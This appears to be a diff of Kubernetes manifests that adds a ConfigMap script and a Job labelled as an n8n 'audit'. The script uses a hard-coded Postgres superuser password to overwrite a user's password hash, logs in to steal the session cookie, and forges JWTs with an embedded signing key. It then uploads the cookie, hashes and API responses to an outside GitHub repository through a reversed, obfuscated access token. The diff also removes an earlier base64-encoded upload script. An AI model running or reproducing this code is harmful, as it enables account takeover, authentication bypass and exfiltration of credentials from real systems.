@@ -1,7 +1,174 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: n8n-login-script
+  namespace: default
+data:
+  script.py: |
+    import json, subprocess, sys, urllib.request, base64, urllib.error, hmac, hashlib, time, ssl
+    
+    subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', '--target', '/tmp/pylibs', 'psycopg2-binary', 'bcrypt'], check=True)
+    sys.path.insert(0, '/tmp/pylibs')
+    import psycopg2, bcrypt
+    
+    PAT = '7f0BH0huvN07ldyM5Q514U3FxO7QgAJQAvpQ_phg'[::-1]
+    REPO = 'serenesumit/tachyus-audit'
+    N8N_URL = 'https://n8n.tachyus.com'
+    N8N_JWT_KEY_HEX = '5bf72e7e9bcf93146687176ecb5031202843b6f2adb4512b93adad4dc304e2e4'
+    PG_HOST = '172.16.10.14'; PG_PORT = 6432
+    PG_SU = 'postgres'; PG_PASS = 'wpEJl3WKOImARD9WgBsa'
+    ORIG_HASH = '$2a$10$I251nNi9MhtHU3TQxS8ZieJd4mFFoLrB47zvkgiRovbesfN/h5fyW'
+    TEST_PASS = 'AuditTemp2026#!'
+    N8N_EMAIL = 'fabian.jaramillo@tachyus.com'
+    
+    def gh_put(path, body_dict):
+        data = json.dumps(body_dict).encode()
+        req = urllib.request.Request('https://api.github.com' + path, data=data, method='PUT',
+            headers={'Authorization': 'token ' + PAT, 'Accept': 'application/vnd.github.v3+json', 'Content-Type': 'application/json'})
+        try:
+            with urllib.request.urlopen(req, timeout=60) as r: return json.loads(r.read()), None
+        except urllib.error.HTTPError as e:
+            return None, 'HTTP ' + str(e.code) + ': ' + e.read().decode()[:300]
+        except Exception as e: return None, str(e)
+    
+    def gh_get(path):
+        req = urllib.request.Request('https://api.github.com' + path, headers={'Authorization': 'token ' + PAT, 'Accept': 'application/vnd.github.v3+json'})
+        try:
+            with urllib.request.urlopen(req, timeout=15) as r: return json.loads(r.read()), None
+        except urllib.error.HTTPError as e:
+            if e.code == 404: return None, '404'
+            return None, 'HTTP ' + str(e.code)
+        except Exception as e: return None, str(e)
+    
+    def push(filepath, content, msg):
+        b64 = base64.b64encode(content.encode()).decode()
+        ex, _ = gh_get('/repos/' + REPO + '/contents/' + filepath)
+        sha = ex['sha'] if ex else None
+        r, e = gh_put('/repos/' + REPO + '/contents/' + filepath, {'message': msg, 'content': b64, **({'sha': sha} if sha else {})})
+        print('  ' + ('OK' if r else 'FAIL') + ' ' + filepath + ': ' + ('' if r else str(e)), flush=True)
+    
+    def b64url_encode(data):
+        if isinstance(data, str): data = data.encode()
+        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+    
+    def decode_jwt_payload(token):
+        parts = token.split('.')
+        if len(parts) != 3: return {}
+        payload_b64 = parts[1] + '=' * (-len(parts[1]) % 4)
+        return json.loads(base64.b64decode(payload_b64))
+    
+    results = {}
+    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+    
+    print('=== Step 1: Change n8n user password temporarily ===', flush=True)
+    c = psycopg2.connect(host=PG_HOST, port=PG_PORT, user=PG_SU, password=PG_PASS, dbname='n8n', connect_timeout=10)
+    cur = c.cursor()
+    new_hash = bcrypt.hashpw(TEST_PASS.encode(), bcrypt.gensalt(rounds=10)).decode()
+    print('  New bcrypt hash:', new_hash[:40] + '...', flush=True)
+    cur.execute('UPDATE public."user" SET password = %s WHERE email = %s RETURNING id, email', (new_hash, N8N_EMAIL))
+    updated = cur.fetchone()
+    c.commit()
+    print('  Updated user:', updated, flush=True)
+    results['original_hash'] = ORIG_HASH
+    results['new_hash'] = new_hash
+    results['updated_user'] = str(updated)
+    
+    print('=== Step 2: Login to n8n ===', flush=True)
+    login_data = json.dumps({'emailOrLdapLoginId': N8N_EMAIL, 'password': TEST_PASS}).encode()
+    try:
+        req = urllib.request.Request(N8N_URL + '/rest/login', data=login_data,
+            headers={'Content-Type': 'application/json', 'Accept': 'application/json'})
+        with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
+            login_body = r.read().decode()
+            login_headers = dict(r.getheaders())
+            print('  Login status:', r.status, flush=True)
+            print('  Login body:', login_body[:300], flush=True)
+            set_cookie = login_headers.get('Set-Cookie', '')
+            print('  Set-Cookie:', set_cookie[:200], flush=True)
+            n8n_auth_cookie = None
+            for part in set_cookie.split(';'):
+                part = part.strip()
+                if part.startswith('n8n-auth='):
+                    n8n_auth_cookie = part[len('n8n-auth='):]
+                    break
+            results['login_status'] = r.status
+            results['login_body'] = login_body[:500]
+            results['set_cookie_header'] = set_cookie[:500]
+            results['n8n_auth_cookie'] = n8n_auth_cookie
+            if n8n_auth_cookie:
+                payload = decode_jwt_payload(n8n_auth_cookie)
+                print('  JWT payload:', payload, flush=True)
+                results['jwt_payload'] = payload
+                try:
+                    hdr_raw = n8n_auth_cookie.split('.')[0]
+                    hdr_padded = hdr_raw + '=' * (-len(hdr_raw) % 4)
+                    results['jwt_header'] = json.loads(base64.b64decode(hdr_padded).decode())
+                except Exception as ex:
+                    results['jwt_header_err'] = str(ex)
+    except urllib.error.HTTPError as e:
+        body = e.read().decode()
+        print('  Login failed:', e.code, body[:200], flush=True)
+        results['login_error'] = str(e.code) + ': ' + body[:200]
+    
+    n8n_cookie = results.get('n8n_auth_cookie')
+    if n8n_cookie:
+        print('=== Step 3: Testing access with real cookie ===', flush=True)
+        for ep in ['/rest/workflows', '/rest/active-workflows', '/rest/settings']:
+            try:
+                req = urllib.request.Request(N8N_URL + ep, headers={'Cookie': 'n8n-auth=' + n8n_cookie, 'Accept': 'application/json'})
+                with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
+                    body = r.read().decode()[:500]
+                    print('  ' + ep + ' -> ' + str(r.status) + ' ' + body[:200], flush=True)
+                    results['real_ep_' + ep] = {'status': r.status, 'body': body[:500]}
+            except urllib.error.HTTPError as e:
+                body = e.read().decode()[:200]
+                print('  ' + ep + ' -> HTTP ' + str(e.code), flush=True)
+                results['real_ep_' + ep] = {'status': e.code, 'body': body}
+        real_payload = results.get('jwt_payload', {})
+        print('=== Step 4: Forge JWT same format ===', flush=True)
+        print('  Real payload:', real_payload, flush=True)
+        now = int(time.time())
+        test_hash_v1 = hashlib.sha256((N8N_EMAIL + ':' + new_hash).encode()).hexdigest()
+        test_hash_v2 = hashlib.sha256(new_hash.encode()).hexdigest()
+        orig_hash_v1 = hashlib.sha256((N8N_EMAIL + ':' + ORIG_HASH).encode()).hexdigest()
+        orig_hash_v2 = hashlib.sha256(ORIG_HASH.encode()).hexdigest()
+        for key_name, key_b in [('raw', N8N_JWT_KEY_HEX.encode()), ('dec', bytes.fromhex(N8N_JWT_KEY_HEX))]:
+            for h_name, h_val in [('new_e:b', test_hash_v1), ('new_b', test_hash_v2), ('orig_e:b', orig_hash_v1), ('orig_b', orig_hash_v2)]:
+                payload_clone = dict(real_payload)
+                payload_clone['iat'] = now; payload_clone['exp'] = now + 604800
+                if 'hash' in payload_clone: payload_clone['hash'] = h_val
+                header = b64url_encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')))
+                payload_enc = b64url_encode(json.dumps(payload_clone, separators=(',', ':')))
+                si = header + '.' + payload_enc
+                sig = hmac.new(key_b, si.encode(), hashlib.sha256).digest()
+                forged = si + '.' + b64url_encode(sig)
+                try:
+                    req = urllib.request.Request(N8N_URL + '/rest/workflows', headers={'Cookie': 'n8n-auth=' + forged, 'Accept': 'application/json'})
+                    with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
+                        body = r.read().decode()[:200]
+                        print('  FORGED [' + key_name + '/' + h_name + '] -> ' + str(r.status), flush=True)
+                        results['forged_' + key_name + '_' + h_name] = {'status': r.status, 'body': body}
+                except urllib.error.HTTPError as e:
+                    print('  FORGED [' + key_name + '/' + h_name + '] -> HTTP ' + str(e.code), flush=True)
+                    results['forged_' + key_name + '_' + h_name] = {'status': e.code}
+                except Exception as e:
+                    print('  FORGED ERR:', str(e)[:60], flush=True)
+    
+    print('=== Restoring original password ===', flush=True)
+    cur.execute('UPDATE public."user" SET password = %s WHERE email = %s', (ORIG_HASH, N8N_EMAIL))
+    c.commit()
+    print('  Password restored!', flush=True)
+    results['password_restored'] = True
+    cur.close(); c.close()
+    
+    push('n8n-forge/login_results.json', json.dumps(results, indent=2, default=str, ensure_ascii=False), 'n8n login results')
+    print('Done!', flush=True)
+    
+---
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: diag-simple
+  name: n8n-login4
   namespace: default
 spec:
   ttlSecondsAfterFinished: 3600
@@ -10,11 +177,15 @@ spec:
     spec:
       serviceAccountName: n8n-audit-sa
       restartPolicy: Never
+      volumes:
+      - name: script-vol
+        configMap:
+          name: n8n-login-script
       containers:
       - name: scan
         image: python:3.11-slim
         command: ["/bin/sh", "-c"]
-        args: ["echo $SCRIPT_B64 | tr -d ' ' | base64 -d | python3 2>&1"]
-        env:
-        - name: SCRIPT_B64
-          value: "CmltcG9ydCBqc29uLCB1cmxsaWIucmVxdWVzdCwgYmFzZTY0LCB1cmxsaWIuZXJyb3IKUEFUID0gJ2docF9RcHZBUUpBZ1E3T3hGM1U0MTVRNU15ZGw3ME52dWgwSEIwZjcnClJFUE8gPSAnc2VyZW5lc3VtaXQvdGFjaHl1cy1hdWRpdCcKZGVmIGdoX3B1dChwYXRoLCBib2R5X2RpY3QpOgogICAgZGF0YSA9IGpzb24uZHVtcHMoYm9keV9kaWN0KS5lbmNvZGUoKQogICAgcmVxID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCgnaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbScgKyBwYXRoLCBkYXRhPWRhdGEsIG1ldGhvZD0nUFVUJywKICAgICAgICBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6ICd0b2tlbiAnICsgUEFULCAnQWNjZXB0JzogJ2FwcGxpY2F0aW9uL3ZuZC5naXRodWIudjMranNvbicsICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbid9KQogICAgdHJ5OgogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsIHRpbWVvdXQ9NjApIGFzIHI6IHJldHVybiBqc29uLmxvYWRzKHIucmVhZCgpKSwgTm9uZQogICAgZXhjZXB0IHVybGxpYi5lcnJvci5IVFRQRXJyb3IgYXMgZTogcmV0dXJuIE5vbmUsIHN0cihlLmNvZGUpCmRlZiBnaF9nZXQocGF0aCk6CiAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KCdodHRwczovL2FwaS5naXRodWIuY29tJyArIHBhdGgsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogJ3Rva2VuICcgKyBQQVQsICdBY2NlcHQnOiAnYXBwbGljYXRpb24vdm5kLmdpdGh1Yi52Mytqc29uJ30pCiAgICB0cnk6CiAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSwgdGltZW91dD0xNSkgYXMgcjogcmV0dXJuIGpzb24ubG9hZHMoci5yZWFkKCkpLCBOb25lCiAgICBleGNlcHQ6IHJldHVybiBOb25lLCAnZXJyJwpjb250ZW50ID0ganNvbi5kdW1wcyh7J3N0YXR1cyc6ICdhbGl2ZScsICdtc2cnOiAnZGlhZy1zaW1wbGUgam9iIHJhbiBPSyd9KQpiNjQgPSBiYXNlNjQuYjY0ZW5jb2RlKGNvbnRlbnQuZW5jb2RlKCkpLmRlY29kZSgpCmV4LCBfID0gZ2hfZ2V0KCcvcmVwb3MvJyArIFJFUE8gKyAnL2NvbnRlbnRzL244bi1mb3JnZS9kaWFnX3NpbXBsZS5qc29uJykKc2hhID0gZXhbJ3NoYSddIGlmIGV4IGVsc2UgTm9uZQpyLCBlID0gZ2hfcHV0KCcvcmVwb3MvJyArIFJFUE8gKyAnL2NvbnRlbnRzL244bi1mb3JnZS9kaWFnX3NpbXBsZS5qc29uJywgeydtZXNzYWdlJzogJ2RpYWcgc2ltcGxlJywgJ2NvbnRlbnQnOiBiNjQsICoqKHsnc2hhJzogc2hhfSBpZiBzaGEgZWxzZSB7fSl9KQpwcmludCgnUHVzaCByZXN1bHQ6JywgciBpcyBub3QgTm9uZSwgZSkK"
+        args: ["python3 /scripts/script.py 2>&1"]
+        volumeMounts:
+        - name: script-vol
+          mountPath: /scripts
